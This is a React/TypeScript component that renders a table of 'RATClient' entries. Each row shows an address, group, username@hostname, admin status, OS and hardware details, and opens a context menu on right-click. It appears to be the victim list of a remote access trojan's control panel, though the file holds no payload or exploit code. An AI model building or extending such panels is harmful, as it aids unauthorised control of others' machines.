import { RATClient, FilterCategories } from "../../../types";

import windowsImg from "../../assets/732225.png";
import linuxImg from "../../assets/pngimg.com - linux_PNG1.png";

import { CpuSvg, GpuSvg, RamSvg, StorageSvg } from "./Svgs";

export const ClientsTable = ({
  filteredClients,
  handleContextMenu,
  setSelectedClientDetails,
  selectedClientDetails,
  searchTerm,
  filters,
}: {
  filteredClients: RATClient[];
  handleContextMenu: (
    e: React.MouseEvent<HTMLTableCellElement>,
    addr: string,
    clientFullName: string
  ) => void;
  setSelectedClientDetails: (client: RATClient) => void;
  selectedClientDetails: RATClient | null;
  searchTerm: string;
  filters: FilterCategories;
}) => {
  const fetchGpus = (gpus: string[]) => {
    let gpuString = "";

    gpus.forEach((gpu) => {
      gpuString += `${gpu}\n`;
    });

    return gpuString;
  };

  return (
    <table className="min-w-full border-separate border-spacing-0">
      <thead>
        <tr>
          <th
            scope="col"
            className="sticky top-0 z-10 border-b  bg-white/90 py-3.5 pr-3 pl-4 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:pl-6 lg:pl-8"
          >
            Address
          </th>
          <th
            scope="col"
            className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
          >
            Group
          </th>
          <th
            scope="col"
            className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
          >
            PC Name
          </th>
          <th
            scope="col"
            className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter lg:table-cell"
          >
            Account Type
          </th>
          <th
            scope="col"
            className="sticky top-0 z-10 border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter"
          >
            Operating System
          </th>
          <th
            scope="col"
            className="sticky top-0 z-10 border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter"
          >
            Hardware
          </th>
        </tr>
      </thead>
      <tbody>
        {filteredClients.length > 0 ? (
          <>
            {filteredClients.map((client) => (
              <tr
                key={client.addr}
                onContextMenu={(e) =>
                  handleContextMenu(
                    e as any,
                    client.addr,
                    `${client.username}@${client.hostname}`
                  )
                }
                onClick={() => setSelectedClientDetails(client)}
                className={`cursor-pointer transition hover:bg-[#1f1f1f] ${
                  selectedClientDetails === client ? "bg-[#2a2a2a]" : ""
                }`}
              >
                <td className="border-b border-accentx py-4 pr-3 pl-4 font-medium whitespace-nowrap text-white sm:pl-6 lg:pl-8">
                  {client.addr}
                </td>
                <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                  {client.group}
                </td>
                <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                  <div className="flex items-center gap-3">
                    <img
                      className="w-4"
                      src={
                        client.os.includes("Windows") ? windowsImg : linuxImg
                      }
                      alt="OS"
                    />
                    {client.username}@{client.hostname}
                  </div>
                </td>
                <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white lg:table-cell">
                  {client.is_elevated ? "Admin" : "User"}
                </td>
                <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                  {client.os}
                </td>
                <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                  <div className="flex items-center gap-2">
                    <div
                      className="tooltip z-50 tooltip-left"
                      data-tip={client.cpu}
                    >
                      <CpuSvg />
                    </div>
                    <div
                      className="tooltip z-50 tooltip-left"
                      data-tip={client.ram}
                    >
                      <RamSvg />
                    </div>
                    <div
                      className="tooltip z-50 tooltip-left"
                      data-tip={fetchGpus(client.gpus)}
                    >
                      <GpuSvg />
                    </div>
                    <div
                      className="tooltip z-50 tooltip-left"
                      data-tip={client.storage}
                    >
                      <StorageSvg />
                    </div>
                  </div>
                </td>
              </tr>
            ))}
          </>
        ) : (
          <tr>
            <td colSpan={6} className="px-6 py-10 text-center text-white">
              {searchTerm ||
              (Object.values(filters) as Record<string, boolean>[]).some(
                (category) => Object.values(category).includes(false)
              )
                ? "No clients match the current filters"
                : "No clients available"}
            </td>
          </tr>
        )}
      </tbody>
    </table>
  );
};
